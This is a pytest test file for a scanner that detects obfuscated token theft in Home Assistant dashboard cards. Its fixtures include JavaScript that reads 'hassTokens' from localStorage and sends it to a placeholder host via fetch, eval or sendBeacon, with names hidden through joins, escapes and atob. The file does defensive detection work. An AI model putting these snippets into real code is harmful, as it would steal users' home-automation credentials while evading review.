"""(0.14.0) js_fold: names a card builds from pieces, and the second Semgrep pass."""

import time
from pathlib import Path

import pytest
import yaml
from conftest import requires_semgrep

from sniff_test.analyzers import js_fold as j

ROOT = Path(__file__).resolve().parents[1]

# --- the evaluator: literal pieces only ------------------------------------------------

HIDING = [
    ("['hass','Tokens'].join('')", "hassTokens"),
    ("'fe' + 'tch'", "fetch"),
    ("x + 'fe' + 'tch'", "fetch"),  # the known run after an unknown operand
    ("'hass'.concat('Tokens')", "hassTokens"),
    ('"\\x68assTokens"', "hassTokens"),
    ('"\\u0066etch"', "fetch"),
    ('"\\u{66}etch"', "fetch"),
    ("String.fromCharCode(101,118,97,108)", "eval"),
    ("String.fromCharCode(0x65, 0x76, 0x61, 0x6c)", "eval"),
    ("'snekoTssah'.split('').reverse().join('')", "hassTokens"),
    ("atob('ZmV0Y2g=')", "fetch"),
    ("window.atob('ZmV0Y2g=')", "fetch"),
    ('`hass${"Tokens"}`', "hassTokens"),
    ('`fe${["t", "ch"].join("")}`', "fetch"),
    ("[['fe','tch'].join(''), x].join('')", "fetch"),  # inner fold inside an unknown outer
    ("['do','cu','ment'].join('')", "document"),
    ("['local','Storage'].join('')", "localStorage"),
]


@pytest.mark.parametrize(("expr", "name"), HIDING)
def test_built_names_are_found(expr, name):
    found = {n for f in j.folds(expr) for n in j.hidden(f)}
    assert name in found


def test_code_built_from_pieces_names_what_it_hides():
    expr = """['fet','ch("https://e.invalid/c?t="+local','Storage.getItem("hass','Tokens"))'].join('')"""
    found = {n for f in j.folds(expr) for n in j.hidden(f)}
    assert {"fetch", "localStorage", "hassTokens"} <= found


LEGIT = [
    "['fetch failed:', m].join(' ')",  # the name is whole in one piece
    "'docu' + 'mentation'",  # a name must stand alone
    "'pre' + 'fetch'",
    "'eval' + 'uate'",
    "'a' + b + 'c'",
    "x + 'px'",
    "['opacity: 0', 'position: absolute'].join(';')",
    '"fetch"',  # a plain literal hides nothing
    "'\\n' + 'x'",
    "1 + 2 + 'x'",  # not evaluated (numbers first): never guessed
    "f('fe') + 'tch'",  # a call isn't a literal
]


@pytest.mark.parametrize("expr", LEGIT)
def test_look_alikes_hide_nothing(expr):
    assert [n for f in j.folds(expr) for n in j.hidden(f)] == []


def test_unknown_pieces_are_never_guessed():
    for expr in ("[a, 'tch'].join('')", "'fe'.concat(b)", "atob(x)", "String.fromCharCode(c)",
                 "['fe', 'tch'].map(f).join('')", "atob('!!!')", '"\\08"'):  # fmt: skip
        assert [f.value for f in j.folds(expr) if f.value == "fetch"] == [], expr


def test_unescape():
    assert j.unescape("\\x41\\u0042\\u{43}\\n\\'\\q") == "ABC\n'q"
    with pytest.raises(j._Unknown):
        j.unescape("\\xZZ")


# --- rewrites keep every offset and line -------------------------------------------------


def test_replacement_keeps_length_and_newlines():
    span = b"[\n  'fe',\n  'tch'\n].join('')"
    rep = j._replacement(span, b'"fetch"')
    assert rep is not None and len(rep) == len(span)
    assert [i for i, c in enumerate(rep) if c == 10] == [i for i, c in enumerate(span) if c == 10]
    assert b'"fetch"' in rep and rep.replace(b'"fetch"', b"").strip() == b""
    assert j._replacement(b"'f'+\n'e'", b'"fetch"') is None  # no line wide enough


def test_analyse_rewrites_and_reports(tmp_path):
    p = tmp_path / "card.js"
    text = (
        "const ok = ['a', 'b'].join('-');\n"
        "const k = ['hass','Tokens'].join('');\n"
        "const t = localStorage.getItem(k);\n"
    )
    p.write_text(text)
    res = j.analyse([p], tmp_path)
    assert [(f.rule_id, f.line, f.file) for f in res.findings] == [(j.RULE, 2, "card.js")]
    assert "hassTokens" in res.findings[0].message
    new = res.rewrites[p]
    assert len(new) == len(text.encode())
    line = new.decode().splitlines()[1]
    assert line.startswith('const k = "hassTokens" ') and line.replace(" ", "").endswith(";")
    assert new.decode().splitlines()[0] == text.splitlines()[0]  # the harmless join untouched
    assert p.read_text() == text  # analyse never writes; semgrep.run does, then restores


def test_analyse_leaves_plain_code_alone(tmp_path):
    p = tmp_path / "card.js"
    text = 'const a = "fetch"; const b = x + "px"; const c = ["a", "b"].join("");\n'
    p.write_text(text)
    res = j.analyse([p], tmp_path)
    assert res.findings == [] and res.rewrites == {}


# --- the rule files stay in step ---------------------------------------------------------


def _rule(path: Path, rid: str) -> dict:
    return next(r for r in yaml.safe_load(path.read_text())["rules"] if r["id"] == rid)


def test_const_copy_matches_the_main_rule():
    main = _rule(ROOT / "rules/js/token-exfil.yaml", "card-token-exfil")
    const = _rule(
        ROOT / "src/sniff_test/rules_const/js/token-exfil-const.yaml", "card-token-exfil-const"
    )
    assert const["pattern-sources"] == main["pattern-sources"]
    assert const["pattern-sinks"] == main["pattern-sinks"]
    assert const["metadata"]["sniff"]["alias"] == "card-token-exfil"
    assert const["options"]["constant_propagation"] is True
    assert main["options"]["constant_propagation"] is False


# --- hostile input stays linear --------------------------------------------------------

_N = 30_000
_HOSTILE = [
    "[" * _N,
    "(" * _N,
    "'" * _N,
    "`${" * (_N // 3),
    "a+" * _N,
    "'a'+" * _N + "'a'",
    "/" * _N,
    "[" + "'a'," * _N + "].join('')",
    "String.fromCharCode(" + "1," * _N + "1)",
    '"' + "\\x" * _N + '"',
    "`" + "\\" * _N + "`",
    "atob('" + "A" * _N + "')",
    "x" + ".join()" * _N,
    "/[" * _N,
]


@pytest.mark.parametrize("text", _HOSTILE, ids=[t[:12] for t in _HOSTILE])
def test_hostile_input_is_fast(text):
    t = time.perf_counter()
    j.tokens(text)
    j.folds(text)
    assert time.perf_counter() - t < 2


def test_a_long_chain_is_read_once():
    text = "x = " + " + ".join(["'a'"] * 20_000) + ";\n"
    t = time.perf_counter()
    j.folds(text)
    assert time.perf_counter() - t < 2


# --- one pass over a file reaches every fold ----------------------------------------------


def test_folds_inside_unknown_code_are_found():
    text = (
        "class C { m(u, h) { globalThis[atob('ZmV0Y2g=')](u, {a: [x, ['fe','tch'].join('')],"
        " b: `t${['ev','al'].join('')}`}); } }"
    )
    found = {n for f in j.folds(text) for n in j.hidden(f)}
    assert found == {"fetch", "eval"}


def test_a_regex_with_quotes_does_not_desync():
    text = (
        "a = /\"/.test(s); b = s.split(/'/); function f(){ return /'\"/g } "
        "c = ['fe','tch'].join('');"
    )
    assert {n for f in j.folds(text) for n in j.hidden(f)} == {"fetch"}


def test_offsets_point_at_the_expression():
    text = "let a = 1;\nlet k = ['hass', 'Tokens'].join('');\n"
    f = next(f for f in j.folds(text) if j.hidden(f))
    assert text[f.start : f.end] == "['hass', 'Tokens'].join('')"


# --- end to end: the cases from the gap report -------------------------------------------

E2E = {
    # names joined, then used through computed globals
    "joined": (
        "const k = ['hass','Tokens'].join('');\nconst f = ['fe','tch'].join('');\n"
        "const t = localStorage.getItem(k);\n"
        "globalThis[f]('https://e.invalid/c', {method:'POST', body:t});\n",
        {"card-token-exfil", "card-hidden-name"},
    ),
    "every_global": (
        "const ls = globalThis[['local','Storage'].join('')];\n"
        "const t = ls[['get','Item'].join('')](['hass','Tokens'].join(''));\n"
        "globalThis[['fe','tch'].join('')]('https://e.invalid/c', {method:'POST', body:t});\n",
        {"card-token-exfil", "card-hidden-name"},
    ),
    "eval_computed": (
        "const s = ['fet','ch(\"https://e.invalid/c?t=\"+local','Storage.getItem(\"hass',"
        "'Tokens\"))'].join('');\nglobalThis[['ev','al'].join('')](s);\n",
        {"card-eval", "card-hidden-name"},
    ),
    "document": (
        "const d = ['do','cu','ment'].join(''); globalThis[d].write('Hello, world!');\n",
        {"card-hidden-name"},
    ),
    "key_only": (
        "const t = localStorage.getItem(['hass','Tokens'].join(''));\n"
        "fetch('https://e.invalid/c', {method:'POST', body:t});\n",
        {"card-token-exfil", "card-hidden-name"},
    ),
    "plus_key": (  # 0.13.0 caught this; 0.14.0 before the second pass did not
        "const t = localStorage.getItem('hass' + 'Tokens');\n"
        "fetch('https://e.invalid/c', {method:'POST', body:t});\n",
        {"card-token-exfil"},
    ),
    "concat_key": (
        "const t = localStorage.getItem('hass'.concat('Tokens'));\n"
        "fetch('https://e.invalid/c', {method:'POST', body:t});\n",
        {"card-token-exfil", "card-hidden-name"},
    ),
    "window_fetch": (  # no trick at all: 0.13.0 knew only a bare fetch()
        "const t = localStorage.getItem('hassTokens');\n"
        "window.fetch('https://e.invalid/c', {method:'POST', body:t});\n",
        {"card-token-exfil"},
    ),
    "template": (
        "const t = localStorage.getItem(`hass${'Tokens'}`);\n"
        "globalThis[`fe${'tch'}`]('https://e.invalid/c', {method:'POST', body:t});\n",
        {"card-token-exfil", "card-hidden-name"},
    ),
    "hex_escape": (
        'const t = localStorage.getItem("\\x68assTokens");\n'
        "fetch('https://e.invalid/c', {method:'POST', body:t});\n",
        {"card-token-exfil", "card-hidden-name"},
    ),
    "atob_name": (
        "const t = localStorage.getItem('hassTokens');\n"
        "globalThis[atob('ZmV0Y2g=')]('https://e.invalid/c', {method:'POST', body:t});\n",
        {"card-token-exfil", "card-hidden-name"},
    ),
    "beacon_member": (
        "const t = localStorage.getItem('hassTokens');\n"
        "window.navigator.sendBeacon('https://e.invalid/c', t);\n",
        {"card-token-exfil"},
    ),
}


@requires_semgrep
@pytest.mark.parametrize("name", sorted(E2E))
def test_gap_report_cases_are_caught(tmp_path, name):
    from sniff_test.scanner import scan

    js, expected = E2E[name]
    card = tmp_path / name
    (card / "dist").mkdir(parents=True)
    (card / "hacs.json").write_text('{"name": "Test Card", "filename": "test-card.js"}')
    (card / "dist" / "test-card.js").write_text(js)
    r = scan(str(card), offline=True)
    rules = {f.rule_id for f in r.findings}
    assert expected <= rules, rules
    # The scan's copy is put back: evidence shows the code as written.
    assert (card / "dist" / "test-card.js").read_text() == js
    for f in r.findings:
        if f.rule_id == "card-token-exfil":
            assert ".invalid" in f.evidence or "fetch" in f.evidence or "sendBeacon" in f.evidence


@requires_semgrep
def test_one_send_is_reported_once(tmp_path):
    """Both passes see a plain send; it's listed once."""
    from sniff_test.scanner import scan

    js, _ = E2E["window_fetch"]
    card = tmp_path / "once"
    (card / "dist").mkdir(parents=True)
    (card / "hacs.json").write_text('{"name": "Test Card", "filename": "test-card.js"}')
    (card / "dist" / "test-card.js").write_text(js)
    r = scan(str(card), offline=True)
    assert [f.line for f in r.findings if f.rule_id == "card-token-exfil"] == [2]


def test_every_token_source_names_a_hint():
    """The second pass skips files with none of TOKEN_HINTS: each source must name one."""
    const = _rule(
        ROOT / "src/sniff_test/rules_const/js/token-exfil-const.yaml", "card-token-exfil-const"
    )
    for src in const["pattern-sources"]:
        text = src["pattern"]
        assert any(h.decode() in text for h in j.TOKEN_HINTS), text


def test_may_hold_token(tmp_path):
    a, b = tmp_path / "a.js", tmp_path / "b.js"
    a.write_text("x = h.auth.data;")
    b.write_text("x = 1;")
    assert j.may_hold_token(a) and not j.may_hold_token(b)
